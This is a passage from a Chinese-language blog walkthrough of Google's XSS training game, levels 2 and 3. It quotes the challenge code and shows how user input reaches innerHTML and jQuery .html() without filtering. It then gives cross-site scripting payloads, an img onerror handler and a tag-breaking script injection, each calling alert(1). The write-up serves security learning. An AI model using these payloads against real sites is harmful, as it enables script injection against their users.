attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>?<span class="token punctuation">"</span></span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>clear-form<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>clear<span class="token punctuation">"</span></span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>Clear all posts<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>     <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>post-container<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>     <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>table</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>message<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>tr</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>td</span> <span class="token attr-name">valign</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>top<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>          <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>img</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>/static/level2_icon.png<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>td</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>td</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>message-container<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>          <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>shim<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>          <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">action</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>?<span class="token punctuation">"</span></span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>post-form<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>textarea</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>post-content<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>content<span class="token punctuation">"</span></span> <span class="token attr-name">rows</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>2<span class="token punctuation">"</span></span>              <span class="token attr-name">cols</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>50<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>textarea</span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>share<span class="token punctuation">"</span></span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>Share status!<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>hidden<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>action<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>sign<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>          <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>td</span><span class="token punctuation">></span></span>      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>tr</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>table</span><span class="token punctuation">></span></span>   <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span></code></pre><p>Level.py</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">class</span> <span class="token class-name">MainPage</span><span class="token punctuation">(</span>webapp<span class="token punctuation">.</span>RequestHandler<span class="token punctuation">)</span><span class="token punctuation">:</span>   <span class="token keyword">def</span> <span class="token function">render_template</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> filename<span class="token punctuation">,</span> context<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    path <span class="token operator">=</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>join<span class="token punctuation">(</span>os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>dirname<span class="token punctuation">(</span>__file__<span class="token punctuation">)</span><span class="token punctuation">,</span> filename<span class="token punctuation">)</span>    self<span class="token punctuation">.</span>response<span class="token punctuation">.</span>out<span class="token punctuation">.</span>write<span class="token punctuation">(</span>template<span class="token punctuation">.</span>render<span class="token punctuation">(</span>path<span class="token punctuation">,</span> context<span class="token punctuation">)</span><span class="token punctuation">)</span>   <span class="token keyword">def</span> <span class="token function">get</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>    self<span class="token punctuation">.</span>render_template<span class="token punctuation">(</span><span class="token string">'index.html'</span><span class="token punctuation">)</span> application <span class="token operator">=</span> webapp<span class="token punctuation">.</span>WSGIApplication<span class="token punctuation">(</span><span class="token punctuation">[</span> <span class="token punctuation">(</span><span class="token string">'.*'</span><span class="token punctuation">,</span> MainPage<span class="token punctuation">)</span> <span class="token punctuation">]</span><span class="token punctuation">,</span> debug<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span></code></pre><p>Post-store.js</p><pre class="language-js" data-language="js"><code class="language-js"><span class="token comment">/* * Objects to implement a client-side post database. */</span> <span class="token keyword">function</span> <span class="token function">Post</span><span class="token punctuation">(</span><span class="token parameter">message</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>   <span class="token keyword">this</span><span class="token punctuation">.</span>message <span class="token operator">=</span> message<span class="token punctuation">;</span>  <span class="token keyword">this</span><span class="token punctuation">.</span>date <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Date</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getTime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span> <span class="token keyword">function</span> <span class="token function">PostDB</span><span class="token punctuation">(</span><span class="token parameter">defaultMessage</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token comment">// Initial message to display to users</span>  <span class="token keyword">this</span><span class="token punctuation">.</span>_defaultMessage <span class="token operator">=</span> defaultMessage <span class="token operator">||</span> <span class="token string">""</span><span class="token punctuation">;</span>   <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function-variable function">setup</span> <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">var</span> defaultPost <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Post</span><span class="token punctuation">(</span>defaultMessage<span class="token punctuation">)</span><span class="token punctuation">;</span>    window<span class="token punctuation">.</span>localStorage<span class="token punctuation">[</span><span class="token string">"postDB"</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token constant">JSON</span><span class="token punctuation">.</span><span class="token function">stringify</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>      <span class="token string">"posts"</span> <span class="token operator">:</span> <span class="token punctuation">[</span>defaultPost<span class="token punctuation">]</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>   <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function-variable function">save</span> <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">message<span class="token punctuation">,</span> callback</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">var</span> newPost <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Post</span><span class="token punctuation">(</span>message<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">var</span> allPosts <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">getPosts</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    allPosts<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>newPost<span class="token punctuation">)</span><span class="token punctuation">;</span>    window<span class="token punctuation">.</span>localStorage<span class="token punctuation">[</span><span class="token string">"postDB"</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token constant">JSON</span><span class="token punctuation">.</span><span class="token function">stringify</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>      <span class="token string">"posts"</span> <span class="token operator">:</span> allPosts    <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token function">callback</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>   <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function-variable function">clear</span> <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">callback</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">setup</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token function">callback</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>   <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function-variable function">getPosts</span> <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">return</span> <span class="token constant">JSON</span><span class="token punctuation">.</span><span class="token function">parse</span><span class="token punctuation">(</span>window<span class="token punctuation">.</span>localStorage<span class="token punctuation">[</span><span class="token string">"postDB"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">.</span>posts<span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>   <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>window<span class="token punctuation">.</span>localStorage<span class="token punctuation">[</span><span class="token string">"postDB"</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>     <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">setup</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre><p>关键代码</p><pre class="language-js" data-language="js"><code class="language-js"><span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">var</span> i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span> i<span class="token operator">&lt;</span>posts<span class="token punctuation">.</span>length<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>          <span class="token keyword">var</span> html <span class="token operator">=</span> <span class="token string">'&lt;table class="message"> &lt;tr> &lt;td valign=top> '</span>            <span class="token operator">+</span> <span class="token string">'&lt;img src="/static/level2_icon.png"> &lt;/td> &lt;td valign=top '</span>            <span class="token operator">+</span> <span class="token string">' class="message-container"> &lt;div class="shim">&lt;/div>'</span><span class="token punctuation">;</span>          html <span class="token operator">+=</span> <span class="token string">'&lt;b>You&lt;/b>'</span><span class="token punctuation">;</span>          html <span class="token operator">+=</span> <span class="token string">'&lt;span class="date">'</span> <span class="token operator">+</span> <span class="token keyword">new</span> <span class="token class-name">Date</span><span class="token punctuation">(</span>posts<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>date<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'&lt;/span>'</span><span class="token punctuation">;</span>          html <span class="token operator">+=</span> <span class="token string">"&lt;blockquote>"</span> <span class="token operator">+</span> posts<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>message <span class="token operator">+</span> <span class="token string">"&lt;/blockquote"</span><span class="token punctuation">;</span> <span class="token comment">//这还少个 '>' 23333</span>          html <span class="token operator">+=</span> <span class="token string">"&lt;/td>&lt;/tr>&lt;/table>"</span>          containerEl<span class="token punctuation">.</span>innerHTML <span class="token operator">+=</span> html<span class="token punctuation">;</span>         <span class="token punctuation">&#125;</span></code></pre><p>可以发现我们提交的内容输出字段会被<code>&lt;blockquote&gt;</code>包裹，考虑到数据是存储的服务器上的可以利用存储型xss，利用<code>onerror</code>事件来进行xss</p><blockquote><p>onerror 事件在视频/音频（audio/video）数据加载期间发生错误时触发。</p></blockquote><p>利用img标签加载一个不存在的对象，会触发onerror事件</p><p>payload：</p><pre class="language-js" data-language="js"><code class="language-js"><span class="token operator">&lt;</span>img src<span class="token operator">=</span><span class="token string">""</span> onerror<span class="token operator">=</span><span class="token string">"javascript:alert(1);"</span><span class="token operator">/</span><span class="token operator">></span></code></pre><p>代码存进了服务器里，只要刷新都会触发</p><img src="/article/xss/image-20210424145306208.png" class="" title="level2-1" loading="lazy"><img src="/article/xss/image-20210424145406792.png" class="" title="level2-2" loading="lazy"><hr><h2 id="level3"><a href="#level3" class="headerlink" title="level3"></a>level3</h2><p><a href="https://xss-game.appspot.com/level3/frame#1">https://xss-game.appspot.com/level3/frame#1</a></p><p>源码·index.html</p><pre class="language-html" data-language="html"><code class="language-html"><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token name">doctype</span> <span class="token name">html</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span>    <span class="token comment">&lt;!-- Internal game scripts/styles, mostly boring stuff --></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>/static/game-frame.js<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token script"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>link</span> <span class="token attr-name">rel</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>stylesheet<span class="token punctuation">"</span></span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>/static/game-frame-styles.css<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>     <span class="token comment">&lt;!-- Load jQuery --></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span>      <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>//ajax.googleapis.com/ajax/libs/jquery/2.1.1/jquery.min.js<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token script"><span class="token language-javascript">    </span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>     <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script"><span class="token language-javascript">      <span class="token keyword">function</span> <span class="token function">chooseTab</span><span class="token punctuation">(</span><span class="token parameter">num</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token comment">// Dynamically load the appropriate image.</span>        <span class="token keyword">var</span> html <span class="token operator">=</span> <span class="token string">"Image "</span> <span class="token operator">+</span> <span class="token function">parseInt</span><span class="token punctuation">(</span>num<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"&lt;br>"</span><span class="token punctuation">;</span>        html <span class="token operator">+=</span> <span class="token string">"&lt;img src='/static/level3/cloud"</span> <span class="token operator">+</span> num <span class="token operator">+</span> <span class="token string">".jpg' />"</span><span class="token punctuation">;</span>        <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">'#tabContent'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">html</span><span class="token punctuation">(</span>html<span class="token punctuation">)</span><span class="token punctuation">;</span>         window<span class="token punctuation">.</span>location<span class="token punctuation">.</span>hash <span class="token operator">=</span> num<span class="token punctuation">;</span>         <span class="token comment">// Select the current tab</span>        <span class="token keyword">var</span> tabs <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">querySelectorAll</span><span class="token punctuation">(</span><span class="token string">'.tab'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">var</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> tabs<span class="token punctuation">.</span>length<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>          <span class="token keyword">if</span> <span class="token punctuation">(</span>tabs<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>id <span class="token operator">==</span> <span class="token string">"tab"</span> <span class="token operator">+</span> <span class="token function">parseInt</span><span class="token punctuation">(</span>num<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            tabs<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>className <span class="token operator">=</span> <span class="token string">"tab active"</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>            tabs<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>className <span class="token operator">=</span> <span class="token string">"tab"</span><span class="token punctuation">;</span>          <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>         <span class="token comment">// Tell parent we've changed the tab</span>        top<span class="token punctuation">.</span><span class="token function">postMessage</span><span class="token punctuation">(</span>self<span class="token punctuation">.</span>location<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"*"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span>       window<span class="token punctuation">.</span><span class="token function-variable function">onload</span> <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>         <span class="token function">chooseTab</span><span class="token punctuation">(</span><span class="token function">unescape</span><span class="token punctuation">(</span>self<span class="token punctuation">.</span>location<span class="token punctuation">.</span>hash<span class="token punctuation">.</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token string">"1"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span>       <span class="token comment">// Extra code so that we can communicate with the parent page</span>      window<span class="token punctuation">.</span><span class="token function">addEventListener</span><span class="token punctuation">(</span><span class="token string">"message"</span><span class="token punctuation">,</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">event</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>event<span class="token punctuation">.</span>source <span class="token operator">==</span> parent<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>          <span class="token function">chooseTab</span><span class="token punctuation">(</span><span class="token function">unescape</span><span class="token punctuation">(</span>self<span class="token punctuation">.</span>location<span class="token punctuation">.</span>hash<span class="token punctuation">.</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>      <span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    </span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>   <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>level3<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>header<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>img</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>logo<span class="token punctuation">"</span></span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>/static/logos/level3.png<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>span</span><span class="token punctuation">></span></span>Take a tour of our cloud data center.<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>     <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>tab<span class="token punctuation">"</span></span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>tab1<span class="token punctuation">"</span></span> <span class="token attr-name">onclick</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>chooseTab(<span class="token punctuation">'</span>1<span class="token punctuation">'</span>)<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>Image 1<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>tab<span class="token punctuation">"</span></span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>tab2<span class="token punctuation">"</span></span> <span class="token attr-name">onclick</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>chooseTab(<span class="token punctuation">'</span>2<span class="token punctuation">'</span>)<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>Image 2<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>tab<span class="token punctuation">"</span></span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>tab3<span class="token punctuation">"</span></span> <span class="token attr-name">onclick</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>chooseTab(<span class="token punctuation">'</span>3<span class="token punctuation">'</span>)<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>Image 3<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>     <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>tabContent<span class="token punctuation">"</span></span><span class="token punctuation">></span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span></code></pre><p>Level.py</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">class</span> <span class="token class-name">MainPage</span><span class="token punctuation">(</span>webapp<span class="token punctuation">.</span>RequestHandler<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">render_template</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> filename<span class="token punctuation">,</span> context<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    path <span class="token operator">=</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>join<span class="token punctuation">(</span>os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>dirname<span class="token punctuation">(</span>__file__<span class="token punctuation">)</span><span class="token punctuation">,</span> filename<span class="token punctuation">)</span>    self<span class="token punctuation">.</span>response<span class="token punctuation">.</span>out<span class="token punctuation">.</span>write<span class="token punctuation">(</span>template<span class="token punctuation">.</span>render<span class="token punctuation">(</span>path<span class="token punctuation">,</span> context<span class="token punctuation">)</span><span class="token punctuation">)</span>   <span class="token keyword">def</span> <span class="token function">get</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>    self<span class="token punctuation">.</span>render_template<span class="token punctuation">(</span><span class="token string">'index.html'</span><span class="token punctuation">)</span> application <span class="token operator">=</span> webapp<span class="token punctuation">.</span>WSGIApplication<span class="token punctuation">(</span><span class="token punctuation">[</span> <span class="token punctuation">(</span><span class="token string">'.*'</span><span class="token punctuation">,</span> MainPage<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">]</span><span class="token punctuation">,</span> debug<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span></code></pre><p>关键代码</p><pre class="language-js" data-language="js"><code class="language-js">html <span class="token operator">+=</span> <span class="token string">"&lt;img src='/static/level3/cloud"</span> <span class="token operator">+</span> num <span class="token operator">+</span> <span class="token string">".jpg' />"</span><span class="token punctuation">;</span>        <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">'#tabContent'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">html</span><span class="token punctuation">(</span>html<span class="token punctuation">)</span><span class="token punctuation">;</span>         window<span class="token punctuation">.</span>location<span class="token punctuation">.</span>hash <span class="token operator">=</span> num<span class="token punctuation">;</span></code></pre><p><code>num</code>是#后面的输入，没有经过任何过滤，所以让它的img标签闭合，再加上我们的代码即可</p><p><code>&lt;img src=&#39;/static/level3/cloud + num + .jpg&#39; /&gt;</code></p><p>即变为<code>&lt;img src=&#39;/static/level3/cloud&#39;&gt;&lt;script&gt;alert(1);&lt;/script&gt;&lt;.jpg&#39; /&gt;</code></p><p>Payload：</p><pre class="language-js" data-language="js"><code class="language-js">'<span class="token operator">></span><span class="token operator">&lt;</span>script<span class="token operator">></span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">></span><span class="token operator">&lt;</span></code></pre><img src="/article/xss/image-20210424150902973.png" class="" title="level3-1" loading="lazy"><img src="/article/xss/image-20210424150928175.png" class="" title="level3-2" loading="lazy"><hr><h2 id="level4"><a href="#level4" class="headerlink" title="level4"></a>level4</h2><p><a 